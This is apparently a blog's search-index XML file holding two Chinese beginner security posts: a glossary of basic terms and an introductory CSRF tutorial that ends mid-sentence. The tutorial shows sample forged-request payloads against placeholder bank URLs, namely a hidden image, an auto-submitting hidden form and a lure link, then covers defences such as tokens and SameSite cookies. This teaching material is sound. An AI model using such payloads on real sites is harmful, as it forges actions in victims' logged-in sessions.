<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>入门安全必知的基础术语</title>
      <link href="/2024/06/21/%E5%85%A5%E9%97%A8%E5%AE%89%E5%85%A8%E5%BF%85%E7%9F%A5%E7%9A%84%E5%9F%BA%E7%A1%80%E6%9C%AF%E8%AF%AD/"/>
      <url>/2024/06/21/%E5%85%A5%E9%97%A8%E5%AE%89%E5%85%A8%E5%BF%85%E7%9F%A5%E7%9A%84%E5%9F%BA%E7%A1%80%E6%9C%AF%E8%AF%AD/</url>
      
        <content type="html"><![CDATA[<h1 id="入门web安全必知的术语–基础篇"><a href="#入门web安全必知的术语–基础篇" class="headerlink" title="入门web安全必知的术语–基础篇"></a>入门web安全必知的术语–基础篇</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>诸位安好，我是pax。这是初识安全的第二篇文章，主要介绍一些信息安全新人入门必知的基础术语，方便大家跟上大佬的节奏（pax当年就是听不懂这些术语，好痛苦.jpg）。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p><em>以下引用均来自Wiki百科和网络</em>。另外，本文介绍略显粗浅，万不能当做学习，仅供了解。</p><h3 id="概念篇"><a href="#概念篇" class="headerlink" title="概念篇"></a>概念篇</h3><h4 id="信息安全与网络安全"><a href="#信息安全与网络安全" class="headerlink" title="信息安全与网络安全"></a>信息安全与网络安全</h4><blockquote><p><strong>信息安全</strong>，意为保护<a href="https://zh.wikipedia.org/wiki/%E4%BF%A1%E6%81%AF">信息</a>及<a href="https://zh.wikipedia.org/wiki/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F">信息系统</a>免受未经授权的进入、使用、披露、破坏、修改、检视、记录及销毁。政府、军队、公司、金融机构、医院、私人企业积累大量与雇员、顾客、产品、研究、金融数据有关的机密信息，而绝大部分的信息现在被收集、产生、存储在<a href="https://zh.wikipedia.org/wiki/%E7%94%B5%E5%AD%90%E8%AE%A1%E7%AE%97%E6%9C%BA">电子计算机</a>内，并通过<a href="https://zh.wikipedia.org/wiki/%E4%BA%92%E8%81%AF%E7%B6%B2">网络</a>传送到别的计算机。如果企业的顾客、财政状况、新产品线的机密信息落入竞争对手的掌握，这种安全性的丧失可能会导致经济上的损失、法律诉讼甚至该企业的破产。保护机密的信息是商业上的需求，而在许多情况中也是道德和法律上的需求。</p></blockquote><p>我们专业的方向叫哪个都可以。特别是web安全方向与网络密不可分，不信你可以看看web的中文意思哦。</p><h4 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h4><blockquote><p><strong>夺旗</strong>（英语：Capture the flag，简称“<strong>CTF</strong>”）在<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8">计算机安全</a>中是一种活动，当中会将“旗子”秘密地埋藏于有目的的易受攻击的程序或网站。参赛者从其他参赛者（攻／防式夺旗）或主办方（危难式挑战）偷去旗子。[<a href="https://zh.wikipedia.org/wiki/%E5%A5%AA%E6%97%97_(%E7%B6%B2%E8%B7%AF%E5%AE%89%E5%85%A8)#cite_note-1">1]</a>[<a href="https://zh.wikipedia.org/wiki/%E5%A5%AA%E6%97%97_(%E7%B6%B2%E8%B7%AF%E5%AE%89%E5%85%A8)#cite_note-2">2]</a>夺旗活动派生出数种变体，当中包括于硬件设备内隐藏旗子。相关比赛可透过在线或实体形式进行，亦可分为高级和入门两种层级。[<a href="https://zh.wikipedia.org/wiki/%E5%A5%AA%E6%97%97_(%E7%B6%B2%E8%B7%AF%E5%AE%89%E5%85%A8)#cite_note-start-3">3]</a>此游戏乃基于<a href="https://zh.wikipedia.org/wiki/%E5%A4%BA%E6%97%97">同名传统户外运动</a>而设计。</p></blockquote><p>咱们信息安全专业的比赛。目前国内最高赛事是XCTF。</p><h4 id="hacker（黑客）"><a href="#hacker（黑客）" class="headerlink" title="hacker（黑客）"></a>hacker（黑客）</h4><blockquote><p>黑客（Hacker）当中的中文音译“黑”字总使人对黑客有所误解，真实的黑客主要是指技术高超的<a href="https://zh.wikipedia.org/wiki/%E7%A8%8B%E5%BA%8F%E5%91%98">程序员</a>，而“<a href="https://zh.wikipedia.org/wiki/%E9%BB%91%E5%B8%BD%E9%BB%91%E5%AE%A2">溃客</a>”（Cracker）才是专指对计算机系统及网络进行恶意破坏的人。除了精通编程、操作系统的人可以被视作黑客，对<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A1%AC%E4%BB%B6">硬件</a>设备做创新的工程师通常也被认为是黑客，另外现在精通网络入侵的人也被看作是黑客。然而在媒体的推波助澜下，“黑客”这一词早已被污名化，由于影视作品、媒体报导通常描述他们进行违法行为，使主流社会一般把黑客看作为“<a href="https://zh.wikipedia.org/wiki/%E7%94%B5%E8%84%91%E7%8A%AF%E7%BD%AA">计算机犯罪分子</a>”（Cybercriminal）。</p></blockquote><h3 id="网络篇"><a href="#网络篇" class="headerlink" title="网络篇"></a>网络篇</h3><h4 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h4><blockquote><p><strong>超文本传输协议</strong>（英语：<strong>H</strong>yper<strong>T</strong>ext <strong>T</strong>ransfer <strong>P</strong>rotocol，缩写：<strong>HTTP</strong>）是一种用于分布式、协作式和<a href="https://zh.wikipedia.org/wiki/%E8%B6%85%E5%AA%92%E9%AB%94">超媒体</a>信息系统的<a href="https://zh.wikipedia.org/wiki/%E5%BA%94%E7%94%A8%E5%B1%82">应用层</a><a href="https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE">协议</a>[<a href="https://zh.wikipedia.org/wiki/%E8%B6%85%E6%96%87%E6%9C%AC%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE#cite_note-ietf2616-1">1]</a>。HTTP是<a href="https://zh.wikipedia.org/wiki/%E5%85%A8%E7%90%83%E8%B3%87%E8%A8%8A%E7%B6%B2">万维网</a>的数据通信的基础。</p></blockquote><p>我们在互联网上想要访问一个URL（这个当做练习，自己去了解一下哦）需要借助一些协议，而HTTP是最主流的一个协议。特别是Web方向的，离不开跟HTTP打交道。作为新手，我们应该了解HTTP的组成部分和作用，侧重了解一下请求包和响应包的构成。</p><h4 id="前端后端"><a href="#前端后端" class="headerlink" title="前端后端"></a>前端后端</h4><blockquote><p>在<a href="https://zh.wikipedia.org/wiki/%E8%BB%9F%E9%AB%94%E6%9E%B6%E6%A7%8B">软体架构</a>和<a href="https://zh.wikipedia.org/wiki/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1">程序设计</a>领域，前端是软体系统中直接和用户交互的部分，而后端控制着软件的输出。将软体分为前端和后端是一种将软体不同功能的部分相互分离的<a href="https://zh.wikipedia.org/wiki/%E6%8A%BD%E8%B1%A1%E5%8C%96_(%E8%A8%88%E7%AE%97%E6%A9%9F%E7%A7%91%E5%AD%B8)">抽象</a>。</p></blockquote><p>前端和后端有各自的语言，这同样是安全新手必须学习的。</p><h3 id="操作系统篇"><a href="#操作系统篇" class="headerlink" title="操作系统篇"></a>操作系统篇</h3><h4 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h4><blockquote><p><strong>操作系统</strong>（英语：Operating System，缩写：<strong>OS</strong>）是一组主管并控制<a href="https://zh.wikipedia.org/wiki/%E7%94%B5%E5%AD%90%E8%AE%A1%E7%AE%97%E6%9C%BA">计算机</a>操作、运用和运行<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A1%AC%E4%BB%B6">硬件</a>、<a href="https://zh.wikipedia.org/wiki/%E8%BD%AF%E4%BB%B6">软件</a><a href="https://zh.wikipedia.org/wiki/%E8%B3%87%E6%BA%90_(%E8%A8%88%E7%AE%97%E6%A9%9F%E7%A7%91%E5%AD%B8)">资源</a>和提供公共<a href="https://zh.wikipedia.org/wiki/%E5%AE%88%E6%8A%A4%E8%BF%9B%E7%A8%8B">服务</a>来组织用户交互的相互关联的<a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%BD%AF%E4%BB%B6">系统软件</a><a href="https://zh.wikipedia.org/wiki/%E7%A8%8B%E5%BA%8F">程序</a>，同时也是计算机系统的内核与基石。操作系统需要处理如管理与配置<a href="https://zh.wikipedia.org/wiki/%E5%86%85%E5%AD%98">内存</a>、决定系统资源供需的优先次序、控制输入与输出设备、操作<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C">网络</a>与管理<a href="https://zh.wikipedia.org/wiki/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F">文件系统</a>等基本事务。操作系统也提供一个让用户与系统交互的操作界面。</p></blockquote><p>大家熟悉的操作系统有windows。</p><h4 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h4><blockquote><p><strong>虚拟机</strong>（英语：virtual machine），在<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6">计算机科学</a>中的<a href="https://zh.wikipedia.org/wiki/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84">体系结构</a>里，是指一种特殊的<a href="https://zh.wikipedia.org/wiki/%E8%BD%AF%E4%BB%B6">软件</a>，可以在<a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E5%B9%B3%E5%8F%B0">计算机平台</a>和<a href="https://zh.wikipedia.org/wiki/%E7%BB%88%E7%AB%AF%E7%94%A8%E6%88%B7">终端用户</a>之间建立一种环境，而终端用户则是基于虚拟机这个软件所建立的环境来操作其它<a href="https://zh.wikipedia.org/wiki/%E8%BD%AF%E4%BB%B6">软件</a>。虚拟机（VM）是计算机系统的<a href="https://zh.wikipedia.org/wiki/%E4%BB%BF%E7%9C%9F%E5%99%A8">仿真器</a>，通过软件模拟具有完整<a href="https://zh.wikipedia.org/wiki/%E7%A1%AC%E4%BB%B6">硬件</a>系统功能的、运行在一个完全隔离环境中的完整<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F">计算机系统</a>，能提供物理计算机的功能。</p><p>有不同种类的虚拟机，每种虚拟机具有不同的功能：</p><ul><li><strong>系统虚拟机</strong>（也称为<a href="https://zh.wikipedia.org/wiki/%E5%85%A8%E8%99%9A%E6%8B%9F%E5%8C%96">全虚拟化</a>虚拟机）可代替物理计算机。它提供了运行整个<a href="https://zh.wikipedia.org/wiki/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F">操作系统</a>所需的功能。虚拟机监视器（<a href="https://zh.wikipedia.org/wiki/Hypervisor">hypervisor</a>）共享和管理硬件，从而允许有相互隔离但存在于同一物理机器上的多个环境。现代虚拟机监视器使用虚拟化专用硬件（主要是主机CPU）来进行硬件辅助虚拟化。</li><li><strong>程序虚拟机</strong> 被设计用来在与平台无关的环境中执行计算机程序。</li></ul></blockquote><p>我们用的一般是系统虚拟机，虚拟机相当于全虚拟化的操作系统，操作系统的硬件等全部通过软件来代替。著名的操作系统有Linux。以后安装虚拟机一般就是linux的各发行版了。</p><h4 id="终端和shell"><a href="#终端和shell" class="headerlink" title="终端和shell"></a>终端和shell</h4><blockquote><p><strong>终端</strong>（英语：Computer terminal），是一台<a href="https://zh.wikipedia.org/wiki/%E9%9B%BB%E8%85%A6">电脑</a>或者计算机系统，用来让用户输入数据，及显示其计算结果的机器，简而言之就是人类用户与计算机交互的设备。终端有些是全电子的，也有些是机电的。其又名<strong>终端机</strong>，它与一部独立的<a href="https://zh.wikipedia.org/wiki/%E9%9B%BB%E8%85%A6">电脑</a>不同，但也是电脑组成的部分。</p></blockquote><p>win+r，cmd。弹出来的黑框框就是终端的命令行（你可以输入命令）。终端可以了解到计算机的各项敏感信息，而这正是攻击者所希望看到的。</p><blockquote><p><strong>Shell</strong>（也称为<strong>壳层</strong>）在<a href="https://zh.wikipedia.org/wiki/%E9%9B%BB%E8%85%A6%E7%A7%91%E5%AD%B8">计算机科学</a>中指“为用户提供用户界面”的软件，通常指的是<a href="https://zh.wikipedia.org/wiki/%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%95%8C%E9%9D%A2">命令行界面</a>的<a href="https://zh.wikipedia.org/wiki/%E8%A7%A3%E6%9E%90%E5%99%A8">解析器</a>。一般来说，这个词是指<a href="https://zh.wikipedia.org/wiki/%E4%BD%9C%E6%A5%AD%E7%B3%BB%E7%B5%B1">操作系统</a>中提供访问<a href="https://zh.wikipedia.org/wiki/%E5%86%85%E6%A0%B8">内核</a>所提供之服务的程序。Shell也用于泛指所有为用户提供操作界面的程序，也就是程序和用户<a href="https://zh.wikipedia.org/w/index.php?title=%E4%BA%A4%E4%BA%92&action=edit&redlink=1">交互</a>的层面。因此与之相对的是<a href="https://zh.wikipedia.org/wiki/%E5%86%85%E6%A0%B8">内核</a>（英语：<strong>Kernel</strong>），内核不提供和用户的交互功能。</p></blockquote><p>Shell是一个命令解释器，它解释用户输入的命令并将其传递给操作系统内核执行。</p><p>我们一般把终端，命令行，shell看作一部分，事实上它们也确实是一个整体。</p><h4 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h4><blockquote><p><strong>环境变量</strong>是一个<a href="https://zh.wikipedia.org/wiki/%E5%90%8D%E5%AD%97%E8%A7%A3%E6%9E%90_(%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1)">动态命名</a>的<a href="https://zh.wikipedia.org/wiki/%E5%80%BC_(%E9%9B%BB%E8%85%A6%E7%A7%91%E5%AD%B8)">值</a>，可以影响计算机上<a href="https://zh.wikipedia.org/wiki/%E8%BF%9B%E7%A8%8B">进程</a>的行为方式。例如一个正在运行的进程可以查询TEMP环境变量的值，以发现一个合适的位置来存储临时文件，或者查询HOME或USERPROFILE变量，以找到运行该进程的用户所拥有的<a href="https://zh.wikipedia.org/wiki/%E7%9B%AE%E9%8C%84%E7%B5%90%E6%A7%8B">目录结构</a>。</p></blockquote><p>环境变量是操作系统中用于存储关键信息和配置信息的动态值。这些值可以影响系统的行为和运行方式，以及应用程序的行为。当大家开始下各个工具和IDE时会开始见到。</p><h3 id="数据库篇"><a href="#数据库篇" class="headerlink" title="数据库篇"></a>数据库篇</h3><p>数据库也是信息安全的一个重要对象。</p><h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><blockquote><p><strong>数据库</strong>，简而言之可视为<a href="https://zh.wikipedia.org/w/index.php?title=%E9%9B%BB%E5%AD%90%E5%8C%96&action=edit&redlink=1">电子化</a>的<a href="https://zh.wikipedia.org/wiki/%E6%A1%A3%E6%A1%88%E6%9F%9C">文件柜</a>——存储电子<a href="https://zh.wikipedia.org/wiki/%E6%AA%94%E6%A1%88">文件</a>的处所，用户可以对<a href="https://zh.wikipedia.org/wiki/%E6%AA%94%E6%A1%88">文件</a>中的资料执行新增、截取、更新、删除等操作[<a href="https://zh.wikipedia.org/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93#cite_note-1">1]</a>。</p><p>所谓“数据库”是以<strong>一定方式</strong>储存在一起、能予多个用户<a href="https://zh.wikipedia.org/wiki/%E5%85%B1%E4%BA%AB">共享</a>、具有尽可能小的<a href="https://zh.wikipedia.org/wiki/%E6%95%B0%E6%8D%AE%E5%86%97%E4%BD%99">冗余度</a>、与应用程序彼此独立的数据<a href="https://zh.wikipedia.org/wiki/%E9%9B%86%E5%90%88_(%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6)">集合</a>。一个数据库由多个表空间（<a href="https://zh.wikipedia.org/wiki/Tablespace">Tablespace</a>）构成。</p></blockquote><p>这个很简单，专门存放数据的地方。大家要熟知比较流行的数据库：</p><ul><li>MySQL</li><li>PostgreSQL</li><li>SQLite</li><li>Oracle Database</li><li>Microsoft SQL Server</li><li>MongoDB</li></ul><h4 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h4><blockquote><p><strong>SQL</strong>，<strong>Structured Query Language</strong>，<strong>结构化查询语言</strong>是一种<a href="https://zh.wikipedia.org/wiki/%E7%89%B9%E5%AE%9A%E7%9B%AE%E7%9A%84%E7%A8%8B%E5%BC%8F%E8%AF%AD%E8%A8%80">特定目的编程语言</a>，用于管理<a href="https://zh.wikipedia.org/wiki/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F">关系数据库管理系统</a>（RDBMS），或在<a href="https://zh.wikipedia.org/wiki/%E5%85%B3%E7%B3%BB%E6%B5%81%E6%95%B0%E6%8D%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F">关系流数据管理系统</a>（RDSMS）中进行流处理。</p><p>SQL基于<a href="https://zh.wikipedia.org/wiki/%E5%85%B3%E7%B3%BB%E4%BB%A3%E6%95%B0_(%E6%95%B0%E6%8D%AE%E5%BA%93)">关系代数</a>和<a href="https://zh.wikipedia.org/wiki/%E5%85%83%E7%BB%84%E5%85%B3%E7%B3%BB%E6%BC%94%E7%AE%97">元组关系演算</a>，包括一个<a href="https://zh.wikipedia.org/wiki/%E6%95%B0%E6%8D%AE%E5%AE%9A%E4%B9%89%E8%AF%AD%E8%A8%80">数据定义语言</a>和<a href="https://zh.wikipedia.org/wiki/%E6%95%B0%E6%8D%AE%E6%93%8D%E7%BA%B5%E8%AF%AD%E8%A8%80">数据操纵语言</a>。SQL的范围包括数据插入、查询、更新和删除，<a href="https://zh.wikipedia.org/wiki/Schema_(%E6%95%B0%E6%8D%AE%E5%BA%93)">数据库模式</a>创建和修改，以及数据访问控制。尽管SQL经常被描述为，而且很大程度上是一种<a href="https://zh.wikipedia.org/wiki/%E5%A3%B0%E6%98%8E%E5%BC%8F%E7%BC%96%E7%A8%8B">声明式编程</a>（<a href="https://zh.wikipedia.org/wiki/%E7%AC%AC%E5%9B%9B%E4%BB%A3%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80">4GL</a>），但是其也含有<a href="https://zh.wikipedia.org/wiki/%E8%BF%87%E7%A8%8B%E5%BC%8F%E7%BC%96%E7%A8%8B">过程式编程</a>的元素。</p></blockquote><p>管理数据库的比较流行的一种语言。有衍生出的漏洞：SQL注入。</p><h3 id="编码篇"><a href="#编码篇" class="headerlink" title="编码篇"></a>编码篇</h3><h4 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h4><blockquote><p><strong>百分号编码</strong>（英语：Percent-encoding），又称<strong>URL编码</strong>（URL encoding）是特定上下文的<a href="https://zh.wikipedia.org/wiki/%E7%BB%9F%E4%B8%80%E8%B5%84%E6%BA%90%E5%AE%9A%E4%BD%8D%E7%AC%A6">统一资源定位符</a>（URL）的编码机制，实际上也适用于<a href="https://zh.wikipedia.org/wiki/%E7%B5%B1%E4%B8%80%E8%B3%87%E6%BA%90%E6%A8%99%E8%AA%8C%E7%AC%A6">统一资源标志符</a>（URI）的编码。也用于为<em>application&#x2F;x-www-form-urlencoded</em> <a href="https://zh.wikipedia.org/wiki/MIME">MIME</a>准备数据，因为它用于通过<a href="https://zh.wikipedia.org/wiki/HTTP">HTTP</a>的请求操作（request）提交<a href="https://zh.wikipedia.org/wiki/HTML">HTML</a>表单数据。</p><p>URI所允许的字符分作<strong>保留</strong>与<strong>未保留</strong>。<strong>保留</strong>字符是那些具有特殊含义的字符，例如：<a href="https://zh.wikipedia.org/wiki/%E6%96%9C%E7%B7%9A">斜线</a>字符用于URL（或URI）不同部分的分界符；<strong>未保留</strong>字符没有这些特殊含义。百分号编码把保留字符表示为特殊字符序列。上述情形随URI与URI的不同版本规格会有轻微的变化。</p></blockquote><p>HTTP要传输数据，而有些字符因为一些原因不能原样传输，便将这些字符进行URL编码。</p><h3 id="语言篇"><a href="#语言篇" class="headerlink" title="语言篇"></a>语言篇</h3><h4 id="前端语言"><a href="#前端语言" class="headerlink" title="前端语言"></a>前端语言</h4><blockquote><ol><li>HTML (HyperText Markup Language)：用于构建网页结构和内容的标记语言。</li><li>CSS (Cascading Style Sheets)：用于设计和样式化网页的样式表语言。</li><li>JavaScript：用于网页交互和动态效果的脚本语言。</li><li>TypeScript：JavaScript的超集，提供了静态类型检查和其他增强功能。</li><li>React：用于构建用户界面的JavaScript库，由Facebook开发。</li><li>Angular：由Google开发的前端框架，用于构建单页应用程序。</li><li>Vue.js：一种渐进式JavaScript框架，用于构建交互式用户界面。</li><li>Svelte：一种构建Web应用程序的新型前端框架，通过编译生成高效的原生代码。</li><li>Bootstrap：一个流行的前端框架，用于快速构建响应式和美观的网页。</li><li>jQuery：一个广泛使用的JavaScript库，简化了处理HTML文档、事件处理、动画等任务。</li></ol></blockquote><p>HTML，CSS，JavaScript是新手前端三件套，越基础越要认真对待。</p><h4 id="后端语言"><a href="#后端语言" class="headerlink" title="后端语言"></a>后端语言</h4><blockquote><ol><li><strong>Java</strong>：<ul><li>Java是一种广泛使用的后端编程语言，具有跨平台性和强大的生态系统。</li><li>一些流行的Java框架包括Spring和Spring Boot。</li></ul></li><li><strong>Python</strong>：<ul><li>Python是一种简单易学的编程语言，被广泛用于后端开发、数据分析和人工智能等领域。</li><li>一些流行的Python框架包括Django和Flask。</li></ul></li><li>**JavaScript (Node.js)**：<ul><li>JavaScript不仅用于前端开发，还可以通过Node.js在后端开发中使用。</li><li>一些流行的Node.js框架包括Express.js和NestJS。</li></ul></li><li><strong>Ruby</strong>：<ul><li>Ruby是一种简洁优美的编程语言，常用于Web开发。</li><li>Ruby on Rails是一个流行的Ruby框架，用于快速构建Web应用程序。</li></ul></li><li><strong>PHP</strong>：<ul><li>PHP是一种广泛用于Web开发的脚本语言，特别适用于构建动态网页。</li><li>一些流行的PHP框架包括Laravel和Symfony。</li></ul></li><li>**C#**：<ul><li>C#是微软开发的一种多用途编程语言，常用于构建Windows应用程序和Web服务。</li><li>ASP.NET是一个流行的C#框架，用于构建Web应用程序。</li></ul></li></ol></blockquote><p>PHP和Java比较流行，python多用于写脚本。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>长路漫漫，道阻且长。愿pax小小的分享能让大家对信息安全的基础术语有一些了解。当然，这篇文章是不全面的，也是不够有深度的。如果想学习安全的话可以向ROIS战队的学长请教，pax曾经就遇到了一个很好的学长呢。</p><p>最后，诸位安好。我是pax，你忠实的同行者。</p>]]></content>
      
      
      <categories>
          
          <category> 安全小窝 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF入门</title>
      <link href="/2024/06/21/CSRF%E5%85%A5%E9%97%A8/"/>
      <url>/2024/06/21/CSRF%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF入门"><a href="#CSRF入门" class="headerlink" title="CSRF入门"></a>CSRF入门</h1><h2 id="0x01-基础学习"><a href="#0x01-基础学习" class="headerlink" title="0x01 基础学习"></a>0x01 基础学习</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>Cross-site request forgery 跨站点请求伪造，是一种 Web 安全漏洞，它允许攻击者诱使用户执行他们不打算执行的操作。它允许攻击者部分规避同源策略，该策略旨在防止不同网站相互干扰。</p><h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>**Step1:**使用者成功登入A 银行网站的帐户，并且代表使用者身份的cookie 在本地保存下来，所以下次再来A 银行网站时，不用重新登入</p><p>**Step2:**由于使用者没有登出A 银行网站的帐户，在浏览B 恶意网站时，B 网站有个被设为透明的图片，因为是透明的，所以使用者在画面上看不到，然而该图片包含一段恶意程式码，程式码如下。</p><pre><code class="highlight jsx"><span class="comment">// 備註：CSRF 攻擊手法有很多，此程式碼例子是一種最基本的攻擊方法之一</span>&lt;img  src=<span class="string">&quot;http://a-bank.com/transfer.do?acct=BadGuy&amp;amount=100000 HTTP/1.1&quot;</span>  width=<span class="string">&quot;0&quot;</span>  height=<span class="string">&quot;0&quot;</span>/&gt;</code></pre><p>**Step3:**使用者虽然将看不到此图片， 但是，浏览器仍会向<code>http://a-bank.com/</code>提交请求，同时此请求是带有使用者的cookie，所以A 银行可以辨识使用者身份，此恶意攻击执行成功。</p><p>总结：CSRF攻击利用了受害者的cookie，本质上还是信任的问题，这也为如何防范CSRF攻击提供了思路。</p><h2 id="0x02-CSRF类型"><a href="#0x02-CSRF类型" class="headerlink" title="0x02 CSRF类型"></a>0x02 CSRF类型</h2><h3 id="GET型CSRF"><a href="#GET型CSRF" class="headerlink" title="GET型CSRF"></a>GET型CSRF</h3><p>URL附带上参数，已经攻击成功了。</p><pre><code class="highlight plaintext">&lt;img src=&quot;htp://bank.example/withdraw?amount=1000O&amp;for=hacker&quot;&gt;</code></pre><p>可以看出这与XSS很接近，在某些情况下这两种攻击差别也不大。以下是·二者的区别：</p><blockquote><p>XSS和CSRF的区别在于<strong>攻击方式不同</strong>。 XSS攻击是通过注入恶意脚本来攻击，而CSRF攻击则是利用用户在已登录的Web应用程序中的身份进行攻击。 此外，XSS攻击的目标是获取用户的敏感信息或劫持用户会话，而CSRF攻击的目标是在用户不知情的情况下执行恶意操作。</p></blockquote><h3 id="POST型CSRF"><a href="#POST型CSRF" class="headerlink" title="POST型CSRF"></a>POST型CSRF</h3><pre><code class="highlight plaintext">&lt;form action=&quot;ht://bank.example/withdraw&quot; method=POST&gt;&lt;input type=&quot;hidden&quot; name=&#x27;account&quot; value=&quot;xiaoming&quot; /&gt;   //name为参数value为参数的值&lt;input type=&quot;hidden&quot; name=&#x27;amount&quot; value=&quot;10000&quot; /&gt;&lt;input type=&quot;hidden&quot; name=&quot;for&quot; value=&quot;hacker&quot; /&gt;&lt;/form&gt;&lt;script&gt; document.forms[0].submit(); &lt;/script&gt;    //自动提交表单</code></pre><p>自动提交表单，这种不需要交互，但是比较理想。</p><h3 id="链接型CSRF"><a href="#链接型CSRF" class="headerlink" title="链接型CSRF"></a>链接型CSRF</h3><p>链接类型的CSRF并不常见;比起其他两种用户打开页面就中招的情况,这种需要用户点击链接才会触发。这种类型通常是在论坛中发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招,攻击者通常会以比较夸张的词语诱骗用户点击;</p><p>例如:</p><pre><code class="highlight plaintext">&lt;a href=&quot;http://test.com/csrf/withdraw. php?amount=1000&amp;for=hacker&quot; taget=&quot;blank&quot;&gt; 重磅消息! !&lt;a/&gt;</code></pre><h2 id="0x03-防御方法"><a href="#0x03-防御方法" class="headerlink" title="0x03 防御方法"></a>0x03 防御方法</h2><h3 id="加上验证机制"><a href="#加上验证机制" class="headerlink" title="加上验证机制"></a>加上验证机制</h3><p>那些看似简单的图形验证码、简讯验证码等等其实也是为了防止CSRF攻击</p><h3 id="不要用GET请求来做关键操作"><a href="#不要用GET请求来做关键操作" class="headerlink" title="不要用GET请求来做关键操作"></a>不要用<code>GET</code>请求来做关键操作</h3><p>GET请求不需要点击，可以直接在url上。换句话说：只要你进了B网站，你在A网站的信息就已经不安全了，而这正是在你完全不知情的情况下进行的。</p><p>相比GET请求，POST请求至少需要一个点击的步骤，这也是为什么一些广告需要点击。</p><h3 id="检查domain"><a href="#检查domain" class="headerlink" title="检查domain"></a>检查domain</h3><ol><li>浏览器会在request header 加入<code>Referer</code>及<code>Origin</code>两个栏位代表请求的来源domain，server 可以检查这两个栏位的值是不是允许的domain，虽然这两个栏位是<a href="https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name">Forbidden header name</a>，但仍有<a href="https://www.trustedsec.com/blog/setting-the-referer-header-using-javascript/">些小</a>技巧可以修改，而且有些浏览器可能没有这两个栏位，所以只用这个方法并不安全。</li><li>后端服务在response header<code>Access-Control-Allow-Origin</code>指定允许的domain，浏览器会先发出preflight 请求给server 检查client domain 是否被允许，如果允许的话才会再发出真正的请求。</li></ol><h3 id="CSRF-token"><a href="#CSRF-token" class="headerlink" title="CSRF token"></a>CSRF token</h3><blockquote><p>server 加密产生一个唯一且有时效性的token，在前端载入页面时或是在呼叫需要保护的api 之前先跟server 取得这个token，再把token 放进api request header 中送给server 检查是合法token 才接受请求。</p><p>CSRF token 就像是一次性使用的验证码来让请求多一层保护，所以特别需要注意取得CSRF token 的api 不能接受跨网域的请求，如果让骇客有机会取得CSRF token 一样有风险。</p><p>这个也是最常见的方法，实作上可以使用套件达成，例如nodejs 的<a href="http://expressjs.com/en/resources/middleware/csurf.html">csurf</a>。</p></blockquote><p>token起到验证的作用，但如果这个token可以被拿到那也没有意义——取得CSRF token 的api 不能接受跨网域的请求。</p><h3 id="浏览器本身防护-SameSite-cookies"><a href="#浏览器本身防护-SameSite-cookies" class="headerlink" title="浏览器本身防护- SameSite cookies"></a>浏览器本身防护- SameSite cookies</h3><blockquote><ul><li>Strict: 这个cookie 只会跟着相同domain 的请求送出，不会跟着cross site request 一起送出去</li><li>Lax: 只允许特定方式的cross site request 可以一起带着送出去，特定方式包含：<code>&lt;a&gt;</code>, <code>&lt;link rel=&quot;prerender&quot;&gt;</code>, <code>&lt;form method=&quot;GET&quot;&gt;</code>，Chrome set cookie 预设<code>SameSite=Lax</code></li></ul></blockquote><h3 id="Double-submit-cookie"><a href="#Double-submit-cookie" class="headerlink" title="Double submit cookie"></a>Double submit cookie</h3><p>Double submit cookie: 前端随机产生一个CSRF token，同时放进cookie 以及每个request header，server 检查两边的token 是相同的才接受请求，因为浏览器的设计骇客无法将伪造的token 放进你的domain的cookie，此时跨domain 